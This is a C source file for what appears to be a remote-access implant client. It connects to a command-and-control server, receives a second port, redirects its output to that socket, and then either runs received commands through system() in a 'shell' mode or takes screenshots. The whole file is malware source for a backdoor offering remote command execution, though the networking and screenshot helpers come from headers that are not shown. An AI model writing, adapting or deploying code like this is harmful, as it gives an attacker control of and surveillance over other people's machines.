#include <help.h>
#include <network.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define IP_ADDR "127.0.0.1"
#define PORT "443"
#define PORT_LENGTH 6

enum MODE mode = NORMAL;

static int get_command(int fd)
{
    char buffer[BUFFER_SIZE];

    memset(buffer, 0, BUFFER_SIZE);

    if (c2_recv(fd, buffer) == -1)
    {
        fprintf(stderr, "Error while receiving data...\n");
        close(fd);
        exit(EXIT_FAILURE);
    }

    if (strcmp(buffer, "mode shell") == 0)
    {
        mode = SHELL;
    }

    else if (strcmp(buffer, "mode normal") == 0)
    {
        mode = NORMAL;
    }

    else if (mode == SHELL)
    {
        system(buffer);
    }

    else if (strcmp(buffer, "screenshot") == 0)
    {
        screenshot();
    }

    return 0;
}

int main(void)
{
    int first_fd, sec_fd;
    int res;
    int port;
    char buffer[BUFFER_SIZE];
    char *prefix, *value;
    char new_port[PORT_LENGTH];

    first_fd = c2_connect(IP_ADDR, PORT);
    if (first_fd == -1)
    {
        fprintf(
            stderr, "Impossible to connect to %s on port %s\n", IP_ADDR, PORT);
        exit(EXIT_FAILURE);
    }

    while (1)
    {
        memset(buffer, 0, BUFFER_SIZE);

        res = c2_recv(first_fd, buffer);
        if (res == -1)
        {
            fprintf(stderr, "Error while receiving data...\n");
            close(first_fd);
            exit(EXIT_FAILURE);
        }

        prefix = strtok(buffer, ":");
        value = strtok(NULL, ":");
        if (value == NULL)
        {
            continue;
        }
        if (strcmp(prefix, "port") == 0)
        {
            port = atoi(value);
            if (port == 0 || snprintf(new_port, PORT_LENGTH, "%d", port) < 0)
            {
                continue;
            }
            break;
        }
    }
    close(first_fd);

    sec_fd = c2_connect(IP_ADDR, new_port);
    if (sec_fd == -1)
    {
        fprintf(stderr,
                "Impossible to connect to %s on port %s\n",
                IP_ADDR,
                new_port);
        exit(EXIT_FAILURE);
    }

    dup2(sec_fd, 1);
    dup2(sec_fd, 2);

    while (1)
    {
        if (get_command(sec_fd) == -1)
        {
            break;
        }
    }

    close(sec_fd);
    return 0;
}
